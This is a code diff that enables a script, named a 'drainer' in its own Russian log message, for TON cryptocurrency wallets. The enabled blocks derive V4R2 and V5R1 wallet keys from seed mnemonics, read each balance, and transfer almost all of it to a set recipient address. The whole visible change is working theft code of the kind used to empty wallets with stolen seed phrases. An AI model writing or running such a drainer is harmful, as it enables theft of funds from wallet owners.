@@ -19,85 +19,85 @@ async function main() {
     console.log("Адрес получателя:", toAddress);
     
     // V4R2
-    // {
-    //     const endpoint = await getHttpEndpoint();
-    //     const client = new TonClient({
-    //         endpoint
-    //     });
-    //     const key = await mnemonicToWalletKey(mnemonics.split(' '));
-    //     const wallet = WalletContractV4.create({
-    //         workchain: 0,
-    //         publicKey: key.publicKey
-    //     });
-    //     const walletContract = client.open(wallet);
-    //     const walletAddress = wallet.address;
+    {
+        const endpoint = await getHttpEndpoint();
+        const client = new TonClient({
+            endpoint
+        });
+        const key = await mnemonicToWalletKey(mnemonics.split(' '));
+        const wallet = WalletContractV4.create({
+            workchain: 0,
+            publicKey: key.publicKey
+        });
+        const walletContract = client.open(wallet);
+        const walletAddress = wallet.address;
         
-    //     console.log("Адрес кошелька v4r2:", walletAddress.toString());
-    //     const balance = await walletContract.getBalance();
-    //     console.log("Баланс TON:", ((balance).toString()));
-        
-
-    //     if (balance > 100_000_000) {
-    //         const seqno = await walletContract.getSeqno();
-    //         console.log("Создание транзакции");
-    //         console.log("Адрес получателя:", toAddress);
-
-    //         console.log(await client.isContractDeployed(Address.parse(toAddress)));
-
-    //         // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
-    //         await walletContract.sendTransfer({
-    //             secretKey: key.secretKey,
-    //             seqno,
-    //             messages: [
-    //                 internal({
-    //                     to: toAddress,
-    //                     value: BigInt(balance) - BigInt(10_000_000)
-    //                 })
-    //             ]
-    //         });
-    //         console.log("Транзакция отправлена");
-    //     }
-    // }
-    // // V5R1
-    // {
-    //     const endpoint = await getHttpEndpoint();
-    //     const client = new TonClient({
-    //         endpoint
-    //     });
-    //     const key = await mnemonicToWalletKey(mnemonics.split(' '));
-    //     const wallet = WalletContractV5R1.create({
-    //         workchain: 0,
-    //         publicKey: key.publicKey
-    //     });
-    //     const walletContract = client.open(wallet);
-    //     const walletAddress = wallet.address;
-        
-    //     console.log("Адрес кошелька v5r1:", walletAddress.toString());
-    //     const balance = await walletContract.getBalance();
-    //     console.log("Баланс TON:", ((balance).toString()));
+        console.log("Адрес кошелька v4r2:", walletAddress.toString());
+        const balance = await walletContract.getBalance();
+        console.log("Баланс TON:", ((balance).toString()));
         
 
-    //     if (balance > 100_000_000) {
-    //         const seqno = await walletContract.getSeqno();
-    //         console.log("Создание транзакции");
-    //         console.log("Адрес получателя:", toAddress);
+        if (balance > 100_000_000) {
+            const seqno = await walletContract.getSeqno();
+            console.log("Создание транзакции");
+            console.log("Адрес получателя:", toAddress);
 
-    //         console.log(await client.isContractDeployed(Address.parse(toAddress)));
+            console.log(await client.isContractDeployed(Address.parse(toAddress)));
 
-    //         // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
-    //         await walletContract.sendTransfer({
-    //             secretKey: key.secretKey,
-    //             seqno,
-    //             messages: [
-    //                 internal({
-    //                     to: toAddress,
-    //                     value: BigInt(balance) - BigInt(10_000_000)
-    //                 })
-    //             ]
-    //         });
-    //         console.log("Транзакция отправлена");
-    //     }
-    // }
+            // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
+            await walletContract.sendTransfer({
+                secretKey: key.secretKey,
+                seqno,
+                messages: [
+                    internal({
+                        to: toAddress,
+                        value: BigInt(balance) - BigInt(10_000_000)
+                    })
+                ]
+            });
+            console.log("Транзакция отправлена");
+        }
+    }
+    // V5R1
+    {
+        const endpoint = await getHttpEndpoint();
+        const client = new TonClient({
+            endpoint
+        });
+        const key = await mnemonicToWalletKey(mnemonics.split(' '));
+        const wallet = WalletContractV5R1.create({
+            workchain: 0,
+            publicKey: key.publicKey
+        });
+        const walletContract = client.open(wallet);
+        const walletAddress = wallet.address;
+        
+        console.log("Адрес кошелька v5r1:", walletAddress.toString());
+        const balance = await walletContract.getBalance();
+        console.log("Баланс TON:", ((balance).toString()));
+        
+
+        if (balance > 100_000_000) {
+            const seqno = await walletContract.getSeqno();
+            console.log("Создание транзакции");
+            console.log("Адрес получателя:", toAddress);
+
+            console.log(await client.isContractDeployed(Address.parse(toAddress)));
+
+            // Отправка токенов (в nanotons: 1 TON = 1_000_000_000 nanotons)
+            await walletContract.sendTransfer({
+                secretKey: key.secretKey,
+                seqno,
+                messages: [
+                    internal({
+                        to: toAddress,
+                        value: BigInt(balance) - BigInt(10_000_000)
+                    })
+                ]
+            });
+            console.log("Транзакция отправлена");
+        }
+    }
     console.log("Дреинер завершил работу...");
 }
 
